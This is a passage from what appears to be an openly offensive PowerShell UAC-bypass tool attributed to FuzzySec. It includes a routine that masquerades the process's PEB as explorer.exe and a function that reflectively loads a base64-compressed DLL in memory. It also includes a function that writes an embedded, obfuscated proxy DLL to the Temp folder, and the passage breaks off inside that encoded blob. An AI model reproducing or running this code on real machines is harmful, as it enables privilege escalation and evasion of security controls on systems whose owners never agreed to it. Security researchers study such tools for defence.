    	# Can easily be extended to other UNICODE_STRING structs in _RTL_USER_PROCESS_PARAMETERS(/or in general)
    	$ImagePathNamePtr = New-Object System.Intptr -ArgumentList $ImagePathName
    	$CommandLinePtr = New-Object System.Intptr -ArgumentList $CommandLine
    	if ($x32Architecture) {
    		echo "[>] Overwriting &Peb->ProcessParameters.ImagePathName: 0x$("{0:X8}" -f $ImagePathName)"
    		echo "[>] Overwriting &Peb->ProcessParameters.CommandLine: 0x$("{0:X8}" -f $CommandLine)"
    	} else {
    		echo "[>] Overwriting &Peb->ProcessParameters.ImagePathName: 0x$("{0:X16}" -f $ImagePathName)"
    		echo "[>] Overwriting &Peb->ProcessParameters.CommandLine: 0x$("{0:X16}" -f $CommandLine)"
    	}
    	Emit-UNICODE_STRING -hProcess $ProcHandle -lpBaseAddress $ImagePathNamePtr -dwSize $StructSize -data $BinPath
    	Emit-UNICODE_STRING -hProcess $ProcHandle -lpBaseAddress $CommandLinePtr -dwSize $StructSize -data $BinPath
    
    	# &Peb->Ldr
    	$_PEB_LDR_DATA = [Activator]::CreateInstance($PEB_LDR_DATA)
    	$_PEB_LDR_DATA = $_PEB_LDR_DATA.GetType()
    	if ($x32Architecture) {
    		$BufferOffset = $PEBFlags.Ldr32.ToInt64()
    	} else {
    		$BufferOffset = $PEBFlags.Ldr64.ToInt64()
    	}
    	$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
    	$LDRFlags = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_PEB_LDR_DATA)
    
    	# &Peb->Ldr->InLoadOrderModuleList->Flink
    	$_LDR_DATA_TABLE_ENTRY = [Activator]::CreateInstance($LDR_DATA_TABLE_ENTRY)
    	$_LDR_DATA_TABLE_ENTRY = $_LDR_DATA_TABLE_ENTRY.GetType()
    	$BufferOffset = $LDRFlags.InLoadOrderModuleList.Flink.ToInt64()
    	$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
    
    	# Traverse doubly linked list
    	# &Peb->Ldr->InLoadOrderModuleList->InLoadOrderLinks->Flink
    	# This is probably overkill, powershell.exe should always be the first entry for InLoadOrderLinks
    	echo "[?] Traversing &Peb->Ldr->InLoadOrderModuleList doubly linked list"
    	while ($ListIndex -ne $LDRFlags.InLoadOrderModuleList.Blink) {
    		$LDREntry = [system.runtime.interopservices.marshal]::PtrToStructure($NewIntPtr, [type]$_LDR_DATA_TABLE_ENTRY)
    		if ([System.Runtime.InteropServices.Marshal]::PtrToStringUni($LDREntry.FullDllName.Buffer) -like "*powershell.exe*") {
    			if ($x32Architecture) {
    				# x86 UNICODE_STRING struct's --> Size 8-bytes = (UInt16*2)+IntPtr
    				[UInt32]$StructSize = 8
    				$FullDllName = $BufferOffset + 0x24
    				$BaseDllName = $BufferOffset + 0x2C
    			} else {
    				# x64 UNICODE_STRING struct's --> Size 16-bytes = (UInt16*2)+IntPtr
    				[UInt32]$StructSize = 16
    				$FullDllName = $BufferOffset + 0x48
    				$BaseDllName = $BufferOffset + 0x58
    			}
    			# Overwrite _LDR_DATA_TABLE_ENTRY struct
    			# Can easily be extended to other UNICODE_STRING structs in _LDR_DATA_TABLE_ENTRY(/or in general)
    			$FullDllNamePtr = New-Object System.Intptr -ArgumentList $FullDllName
    			$BaseDllNamePtr = New-Object System.Intptr -ArgumentList $BaseDllName
    			if ($x32Architecture) {
    				echo "[>] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x$("{0:X8}" -f $FullDllName)"
    				echo "[>] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x$("{0:X8}" -f $BaseDllName)"
    			} else {
    				echo "[>] Overwriting _LDR_DATA_TABLE_ENTRY.FullDllName: 0x$("{0:X16}" -f $FullDllName)"
    				echo "[>] Overwriting _LDR_DATA_TABLE_ENTRY.BaseDllName: 0x$("{0:X16}" -f $BaseDllName)"
    			}
    			Emit-UNICODE_STRING -hProcess $ProcHandle -lpBaseAddress $FullDllNamePtr -dwSize $StructSize -data $BinPath
    			Emit-UNICODE_STRING -hProcess $ProcHandle -lpBaseAddress $BaseDllNamePtr -dwSize $StructSize -data $BinPath
    		}
    		$ListIndex = $BufferOffset = $LDREntry.InLoadOrderLinks.Flink.ToInt64()
    		$NewIntPtr = New-Object System.Intptr -ArgumentList $BufferOffset
    	}
    
    	# Release ownership of PEB
    	if ($x32Architecture) {
    		$NtDll::RtlLeaveCriticalSection($PEBFlags.FastPebLock32)
    	} else {
    		$NtDll::RtlLeaveCriticalSection($PEBFlags.FastPebLock64)
    	} echo "[!] RtlLeaveCriticalSection --> &Peb->FastPebLock`n"
    
        # Sanity check just in case!
        $ProcStatus = Get-WmiObject Win32_Process -Filter "ProcessId = '$PID'"
        if ($ProcStatus.CommandLine -ne "C:\Windows\explorer.exe") {
            Masquerade-PEB -BinPath C:\Windows\explorer.exe |Out-Null
        }
    }
    
    #---------------
    # Initialize IFileOperation COM Object
    #---------------
    function Invoke-IFileOperation {
    <#
    .SYNOPSIS
        Bootstrap function to expose an IFileOperation COM interface to powershell (script-scope).
    
    .DESCRIPTION
        Author: Ruben Boonen (@FuzzySec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
    
    .EXAMPLE
        C:\PS> Invoke-IFileOperation
        C:\PS> $IFileOperation.CopyItem("C:\Some\Dir\a.txt", "C:\Some\Other\Dir\", "b.txt")
        C:\PS> $IFileOperation.PerformOperations()
    #>
    
        # Compressed Dll which wraps the IFileOperation COM
        # Compression --> http://www.exploit-monday.com/2012/12/in-memory-dll-loading.html
        $EncodedCompressedFile = @'
        7Vt7fFx1lT/3kZnMJJk8GkoLAaZNS9PYhLzatFC0k8ykGTIvZiZ9YCXcmblJhk7mjvdO2oZSTBVRP4ACgqLAQl1YEFhhPwsfkccuAlbWFUHRBS0qiuKyvlBXF1Fkzzn3zp2ZJDzWP/y4n483ud/fOed3fud3fud3fr/7yE34nCtAAgAZz9dfB7gPzGMbvPUxj6fnlPs9cI/riVX3CaEnViWns4a3oGtTujLjTSv5vFb0plSvPpv3ZvNefzThndEyandDg3uNZSMWAAgJErT8/Ns7S3afh9XeOqEHAH/B    Ycry    EQQvnucx28S0aPoNUC7hJlNOhwTbPkiq9Fsu7YKPNrQbBdPutdLSg6zH4kch1H0bMbEP9K+2gq1FfrSC7y6qB4pYFrutcfWU/a4wcV63buhpsHxDH3mgfdV62/C3W1dzWtr0lSeGbG1apDe00M1YxCxHuUkNyDgxz3cACG9rkIuPV8WOZgC3dBkaOLGrTseiYLSg5AJTpC1DWmtFKFUeR5WidGg5lp0niwe5/JxZcpMNJ1UwHccjdap4IQn     +dBxJOleLrR01mCidp4pSa4eDKIBlPRLstXwyXcIucA5l8SKcbrljBUqKTqw7NEbCg4ReWby4SVuHBsSDpLrheNGsMFltLdYcCiMlb1huVsjaSrTTcQKN6R3c8Yk9NeAHjl     +z2IGZ5pA6PIhumYs6s51DOxGbOBlrWjWcT8f3Wp0bHE4Nc8z9nGODw2FSnUIbzUsrnHgauHks0AAbtpj0n9VXz5/blwxdZlpV91XZidyqdZN5d4VR8q/JtHXc6pItCTa8la1WbWChqZKd1lUlOw7Y8lZ2auSLTqLZN6cQV4Tj1Dfyb1W3afcs05hpRRukef2OePBsygihUzz  +0Nl2SmxoLiUIpYV2qt3KTNPOc8XW98WIbcSaogu7MU6m9D7fModu83o4BcHw0kLo/JruolWxCpl5XJvyRQQdq4mlxH2KjHS0U6M1JCPrnZh3lO+4bGkvb9YTaEGUL5NIFZPW7ZY6TqUV1+DQp7BK6lhHQlxsvDA6hxJnDQnWiqf9Y19fd0/3xp7BvkGS1EAO8WrUbL8ICVzLG4hOFPVsfsogjQ3oTgHL9vEEXN9u7q/t28eDlJt3Ij      +Aq7N9KKelSusRQ77zXZ85yUV72atCPyw39xtU5QnYjyfGE24xxwPoLfuAarwHS2bOV52VMhFK+1eP2ywdoNceaHDA9xkvdp7R0AjXNpD8TueqegeM1BKuYzzKeBXjHYzfYZ1rnbux7T5GN8sPNU7XOeBMB6FWR/iiTDjqnK5zw+eaPunBHht+JTjgK033YqvfYr8OSNeSzmq28yjjVD1JxhhfcZHkpAaiBxg7XYSH6qnHftZJYo80qkYemzlzTYjH6s5kTkDBFY3H6gIYCRn5JqyhujGL+6aLuDhNJWr   +sYE047AWbsKJ     +zJqAmjIHUHuaZfJbWHumNvkgtzDRwVqp0EEjXzR1Q8OxzbpcXHH/GHh3xEjDYRjMuHvmwjfx/TLNYQfqiNsdBKe6CL8NGPaTfge1iww/g9rHnAwXU/4TCPhXWznBsYOtv86y7/HkiG2s5ItnMH4ikR4JtcqjCcwOrl2PeNPWKeT5RHGWsYHWX6Qe7mW6XGm72T6fKbHmX6JfTif6RaWf53pK80IMH0G08Aefo/pHTzG23h0DrbwqofwnUx3Mi5nHOdWRdY/zL7JHOd1HB/ZjCHjT3lEvUwHGVc0E77GrT7D     Fm5H+Sp4qe5JxKOupxGXOR4Xe+E/6p5B7HceE5vhu/IzogCfkb8vlub3LPGHiO8Hwp8wfbVAeD9jH8tfMGmJ5axzEuMEy3uYvp3pJ5j+OLeaYbyFJTNc+2um383yjzA9yvQBpuvY/nuYXsn6I6ZNxJK3J0svIj4GhH8QCG9l+jXG5xkHWH4xYsxLK    +qSFesadMzqj5lc7X63givpk8y9KKhOB3KP2prEfdXm/ksU4Vmbe1mUILaKORite0WsgQct7ivuV8RaoH2duKvcr4t1ULS4u9xNeDV60OJ66mokD7S2m9xDuKc0w7r2si/NcC5zV8KL7gap2dpjr/Te6DheaoF9XHcYrpIduH9eaWqu6GpYJS2HLzF3VHjSQ3Ul7k7P2oq6eXendLzNfdTdJ51gc/e7z5ROsbmj7u1Su81trjtTWm9z/rqk1GVzN7hTUr/N3eHOShttbnldp7TF5jbUGdJWm/upZ14atrgXh    RdxPwzY3LEq7knmHrfi4qm/RCrVEXe5NAp/bC/P35gVs6M1485rpDK3x7lWCtlco+c6KWxzD9c0QcTmDrqOSFGbu7XhiBSzuQea1kpn29zv3P8gxW1un+eIlLC5q9x3Skmb2+a5V9ppc19xPyDttrldnqPSe2xutO4BacLmLse6tM3d5X5CUm0uhP1N2VxP3bekaZujzJopey13VHCUIXmbowwpc5Qhms1Rhug2Rxmy3      +YoQw7aHGXIYZujDPmgzVGGXGpzlCGX2xxlyJU2Rxlytc1Rhlxnc5QhN9jcsSruySrui/U/kMrc440/l47Y3AuOX1dwv2h4Rfp7mws7X5NuBrqMPuIiPGqjCL+qJ/oTNUQ/UEd3KMccbyYp0wJ8yUESt5N0fuwhyTUufkrEh0IBLmf7Z0tU+6xMtUcaCfs8JH/aTfKnHEtJZHA46Y7uDnlh7cfrqXZxq7K8Bl6rpTumN297+hu0vb1xqbbVdmacpF+pQxaqx1KWyPAxtvxdvo  +7De9PnLCqjjRXuknzwxz/E   +o5VhztexuXlnyfI3wy97LKQxF+uoZQYny6ieQPsSb6iZKcp0SL7IkE9XUkT3lKEq41vfWWvDV1cvYoqnV+/aY6ZbnAcpFGja3+5ABvKQ6kY+blonzwLsoH79vIB+8b5IP3beTDW7b9s/PBuygfTIn3beSDHR9aO9iLbK0gW/4AW/4Fr    +KHeJV9o1EEH3rhQ8tecMG6BoGuv3jVWInohvWITdDLuIXRxxhkPJtxN6OCeBxkmX4v4xcYv8jWvo54Aswx/W2Wz0HA2Q6fgnMbO+AHLGnl+   +yXIN84CL8CvWYrHIGgYwh+Dxc3juCTEd2nHAa6JxCE9mYNJXQf4xIucRyAZoEsXMl2PgUr4ELESccHENfDpai/s/FqRHfzdYixxptwpPVwN2IT3IvYCvcjroB/RWyDx4A2o39DXANfQ+yApxE3wLOIPfBdxAH4IeJm+AniVvgZ4jb02AV+  +B3iKPwBEa  +sggtiUIOYBDfiLmhE3AOtiOfBSsQMnIw4De2IOehALEAXYhH6EA/AIOKFsBVxHnyIF8MI4odhDPEyiCFeAeOIV8M5iNfCBOL1kEG8CbKIN0Me8TYwEO+EA4h3wyHEe+D9iPfBhxAfhMsQH4YrER+DTyA+DtchfhVuQnwKbkH8JtyO        +Czchfgc3IP4PHwB8UfwL4j/CY8i/gweR3wZnkD8b/gG4ivwDOIf4TmBEo5QFn6AWCu8iFgv/BSxSXgZsVX4LeIK4VXENuF1RK8gixh/wYXYIXgQQ8IyxJiwAjEpnIS4S1iNuEdYh3iesAExI/QiTgubEHPCGYgFYRtiUQggHhDOQrxQiCLOC0nEi4XdiB8WzkW8TEgjXiFMI14tzCBeK+iI1wv7EW8SLkS8WTiMeJtwCeKdwqWIdwtXIN4jXIN4n/BpxIcFyqvHhBuRfly4GfGrwmcRnxI     +h/hN4Z8RnxXuQ3xOeEjshjpwyd2wDFoQT4RexHY4HfEdEEbsZzyDcZjlY5BATLDk3Yxp2Iu4F66RH4WDsEx8ASX/KL8AH4BnZElIw/OIRLcj7a5pZ3qbbOBTz3mMa+ERcR08Jt6A541IH8HzVjzvQP4uLP8Jy8/j+QDSj2L5ZSyfxPNbSD+D5zE4in0+Jr6E52/xfA1Pl/CY2IznOjy78DwNzzOER8RhLMdgEvNW5Of6UJ0si0hLsMbtxTV2DviFU+BGhwDy/MK3tPR0XvkK+VYY5Tfa1bJPekxKxh+X        +cZ7WJuJqzlVMVT9vF7YGtYyszn1nbBdLSbnCuqIrs0MhxJBP0ypxQl+rzMSHZnY6Yskw75YLBjZPuqL+EMBku6aGAsEYpHAzkB8JFgSBXzx0O4RXzA0HmfJRCQaDwyPxxOBeCDmw4KFw9HISDAeDkfHLQF1EBkfC  +z0xSPYCSSC2/2RCX8gMZaMxnxDiWhoPMnty5XIBSLJeCDkSwZ3LKhb0DDgDybfqGGpjr33RyNJfzARC/l2J6Lj8WE0mxy1mtEYE7sTLFmojP0lSxU44kA8Ho2PB021WDwwEoiP+uL +UDAyBtExy954PGRS3Ahd8oUD0chwNBQKJoLRSFXwyrwVOXTdFO3ClmePB+OBQCiww5ZO  +EKh6M7xiD8KiTmjqM50B6NLjn4kGvf5/fFAIjHki1d3ER7zB8ui2O4EeRJM7vYlk/HgUIJrwuOhZJAGz8Ex/QlHdwR8mEO   +4Xg0kdiBExAuVZmGRqPRsYQdG0wMdAObB3YlAxEaqa2cGAvGzhqPDCdLwolEMBwLBWLx6HZy2XKOsikSGE4G/BMYhDCOrqQcQto0lhiN7rQjhO3DsWSpl3AwEgwHzwkMRXdZIcKoh30ha2rZFA8vGgnthn1KbladmIAZI63puWwKCqk0BHRd033ptGoYfjWfVTMJ3RLGlOJ0RCuOaLP5sjAxrdD71B1ZLacUs1q  +SjupaX5VLdiyuKYV/Vnd5oN5dCGbGcnmVMMWRlTUQY/yeTVdLPejzeppNWjEhzOmwK8axQrWrtcWKGiLNPYv0CA+McsjxuGNKvlMTrU0xnFnGVbyaTVni8qs1YZ0glN5TUdRclrX9gcn0f+CZiCfKREFIxtR9       +fmhnVVKSKPW5QvPxctqDpHzfClNJ3kqelsBvQsgjGNvQQx3bfPZq2u42p6Lp1Th7L50jRAQSssHJ5/X/XwbL4cooUq2mKd/Qt1WGC6H8wbRYqCHZBiXFXS02ZbMMzCbptQZtSkrlZKZlNFEiTUYoz+5opBDOOpTKkYpwtKJKtTamAWhRQdJVbAwyoxmCZp7FSNqFMYwn3qMDFgZPN7hzVtb1aFzH6LqIzdiIa+RWb3qhA0J0lJ5VS  +PpjzDvHZfDGLDuP1w5JUXE0siRkpHBZ5x40jyJDvSXWmgOtAZT4xaoULJ5FaxxQd3ZviOiM7lckzNanlMqpeMoBJwmTeKrfzYkCbcyWNYa1g01xO49jy3J8ZHl8Oe83M        +bW8ShfIYL6o6pNKmocE5LGddSyxhkeqBUVXwZfZlzVUGM8rJmHlMnbjx0ttERtgPvqKRT2bmkXOr6Zmp6YoimUZmtqRNbJVMp9hqDOp3FwyW6wUV3m3hLauZNQZRd9baTyfyZL3Sm6xPg1vh4ph1vKLK7HlZHZq1hz74mrMzLSeLVRXjuSUKaNqZIWsudHhjYdywFq8i2xhWmdm08WlfCjM6dmp6SWrcALyc+UKKxVZXsymsrlssaJ2Wg9r        +6qTO5G9gBbLUHaqlAsxFYOVR5b/6FXaX/dPYpgod2hlaZVyOxeraizz1o7O8oql688qOW2K0pEUoEBgdT+Gm/+QRjxtZjt1bDmULWbUAukZWZjQUudDWsnlUkp6bwKXLgSrErTUBVcZk1OKFlaMvRDGhTSt5KxLlZnugQNZo4j7tz6DFdmdmr43qRWR5G20v687k8tVJz9LrOHNaPsog0dmSyJM        +r3MWQMZzuESiJnfh/CCpzUNMV01l57JaUaxktVVc8HYlZWsrtLs2VU2g1HhMpgobf/WnlvmfYUCJxgOpJhVjaRmNpzUCkbJNk5lyVqJpF5sWlcpD225zWQJFkfVvO2CQH52pjo8w3jvnS/FCDccygkO13Q2l9HVPAQOqGlM1pAym09Pk+PZNAcfMngZyOZNunrOYThnmLcEZdFkFWdN2ntns5gbgZy6zxTjXpFWfWmmFbOw7hfj6mRONSXR1PlIla7PgQNplRc8+PSp2Rk1X4zOFqOTcSU/pS6ui       +CIy9IwLlq88OcnNTPdEtqIolPE/eWhjfB6WiKiVgVeyTNJzbyq6BBXDewniUteh5gya1gkinGLZlLbny+Z82cn8TZDr1qg4/m9eVRhEVAkMDJIdadN5AI33FhRL0UG1y7euaC/aaM0jbtVw46buQF18yatFRKqvi+bXlxtboqqbteb1wTccPCBjNR5r7DS9S1skzG6FBh4+aYcsPc7g2+ZylxVgvAuTf0skGT2LxKY5SRjebWSz6XFaUBpNRpQwJBa1GyJWnL9GVBaRPYId    +LkavuNbrzlmCF/81ljunzDBzG87mFNhSRRVPRiBc9LGhQcswHjhQxuAqX90Jz1gBLSSjRu8KoyU+YD+bQ+x4lalpV9XiSbYwleIHF5AjmMBW9zxnA0bK4ZGoGSsx63cZYsqVaYCBygdZ0tcggCeZx4lVI5V+RbEybSWGPLrHJ/PoN3RLiuaGYtajqLwI6F8VKIN/+9tJoWP5OUpZQHQWMkVyGqfE6pUMxlUA    +1y6KFzy7VJqyHl7LQenopCyofX8rSqucXFk/TtRWCmBD9fWZWcK7SYrbYIO0Ew8UDUCjghCi6rswtsWvgXXZGy+fmKp884mpRn4OgQZtTVA/MFIpzpQ1CxyCYAjqcGqTgfIBgPyiQgR7YiD      +DeHbBZvwhugsGmOpBagv0oYRkvfiTYnkK2xGlosYWEJYdxPIQeKEDDqLOIViPvXjhdH4tfculr93d9pt3b/s74YZfjj31m5tB9gpCreQFoQaJ5mZiPQQi86q4DDWgJYwaouO4llphGUiOZfThR21bDQhtXLOC2BUep0gKLWtMdJgFtl4GtU7B5ESHh+yiES94HCC0hJuDTi7mL0fN5qDkFFAueTxtbWhUNGmPp/bzF+zZsXLg      +Y/wd5myAOtAlghkghoCB0EtgZugjqCeoIEAYN08NZuXRQKJQCaoIXARuAnqCOoJGgg8BI0ETQTNBC0EywhaCY4jWE5wPMEKgpUEJxCcSNBGcBLByQSnEHgJVhGsJmgnWEOwluBUgnUEHQTrCToJ3kGwgaCLoJvgNIIegl6CPoJ+go0EmwgGCTYTnE5wBsFWgjMJQKDgEIhMUYjpJZ9M0Zbps1OZvsGSKYHkbQTz/MJPIBDNV3/4W0vQROAl2EYwz1    +YCgSiqSXTx0UyfY0q0yekMn1eSv0IBKJc6raWoEkW5gV06GEEmBeRapKQelgmtobAMS+0CccJouhwSY7mesnR0oZnK9JBLMOiQ0RyBZ4dlHctrU6viNhytsMrCZhXNch6PE5mmsddYKWpxwVSm6dldxNaIc+wqYuUXFjl9tZwiafLKxOJTL3XYVGIDTbTXI/rALso6       +JvvdfJBjwuRHLA5cIsRwdcTipQB111tXh5Aa6gvtvY9zW16AG2oxpRaENHZIF7afFSH20ta3hwa1q8dd4aNN087vEQLbXxQPCXVjL2KHiaO9AsdusVa7E7zDFcooL1ffHJ9MlXUly+U1cKES1v31nxOxRDQD3z/W+LAA3Vt4NQw++PjxegxX6e8j7yWa+3r6dnEGC9AGv6Bzb2pzJKT1dvT4/SNdA/oHZt3pwa7OodTG9MKf39fZm+SYB6AZy93T30A    +AWoMYfGBrfblrYMjCoKKmNk109ysZ010C6t78rNZDZ1DWQmhzc3L9pMr1lcjPQaMx32dSkZyDVM9mrDHZtGdjS0zUwkEp3bdmk9nYN9G3ZpPT39m3sU/tMzYH+zX2bMr1qlzrYuxnrVbUrld64sUvpVfs29ab7B1OT1scPpe/LKRZt1BV9ynEaQDzhTxg/DuQevKohPP/7F9Z3Hf6Ng6qHT99DlwVjT6q/f3IPXn72FrXCnqr4GRN497lAtAefxPZYF/fqqu5CpvT94/+Xwx8p0     +eWvr9f4ohFKrmJYbxo5nJhJZs334iqKj8j0vH6WrTRtKSRvx1/BYfAk7PC/A+CKjmtiZ4l5HTQ/w7sOg9ga8X/T2yVBhB3QAImEOn70gQEIQoR5IOII+Z/XcBD8i//VP5yt2zzXRbHF5kFXprfvO/A+y8d7WQhh3dSQcDHWzC/Q1rDrZJYq6DUwHoFiqin2d8w3S1fTx8ho09F1MqifGoJSwdYp8f    +GcC7Nvo3jRM4HsOoM4M/KuoXwbAsr66oK3D/czhahfXK/ntQp9SfH08D0uxHocrPkkYU5SqPplzbg7t/2cYOrjcq2vZCN+qUTuqzBfWD7Cvp4rM9tix79sZ9dePdao6/vx5lGyGsn+LWNMoCjo88n4JpoP9nWSzzwmfx9OJ9MMWQPinv5BiV7ZgzlUF+hud0rx1NQC3qM2rZy1p+l7zN/5/838pxj2GthrJZjHmxam7eLN4DHO/qtgujvjDmm7mNDzUMHlsKrc9hJN6q3V/02GZ+819451    +6478dfw3H/wI=
'@
    
        # Decompress & load assembly
        $DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedFile),[IO.Compression.CompressionMode]::Decompress)
        $UncompressedFileBytes = New-Object Byte[](14336)
        $DeflatedStream.Read($UncompressedFileBytes, 0, 14336) | Out-Null
        [Reflection.Assembly]::Load($UncompressedFileBytes) | Out-Null
    
        # PS C:\Users\b33f> $IFileOperation |Get-Member
        # 
        #    TypeName: FileOperation.FileOperation
        # 
        # Name              MemberType Definition
        # ----              ---------- ----------
        # CopyItem          Method     void CopyItem(string source, string destination, string newName)
        # DeleteItem        Method     void DeleteItem(string source)
        # Dispose           Method     void Dispose(), void IDisposable.Dispose()
        # Equals            Method     bool Equals(System.Object obj)
        # GetHashCode       Method     int GetHashCode()
        # GetType           Method     type GetType()
        # MoveItem          Method     void MoveItem(string source, string destination, string newName)
        # NewItem           Method     void NewItem(string folderName, string name, System.IO.FileAttributes attrs)
        # PerformOperations Method     void PerformOperations()
        # RenameItem        Method     void RenameItem(string source, string newName)
        # ToString          Method     string ToString()
    
        $script:IFileOperation = New-Object FileOperation.FileOperation
    }
    
    #---------------
    # Write proxy dll to disk
    #---------------
    function Emit-Yamabiko {
    <#
    .SYNOPSIS
        Bootstrap function to write x32/x64 Yamabiko to disk. Exposes $DllPath to powershell (script-scope).
    
        Yamabiko: a mountain god, used to describe the phenomenon of a delayed echo in mountains and valleys.
    
    .DESCRIPTION
        Author: Ruben Boonen (@FuzzySec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
    
    .EXAMPLE
        C:\PS> Emit-Yamabiko
        C:\PS> $DllPath
        C:\Users\b33f\AppData\Local\Temp\yam1475935850.tmp
    #>
    
        $script:DllPath = $env:Temp + "\yam$(Get-Random).tmp"
    
        $yamabiko32 = @'
        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 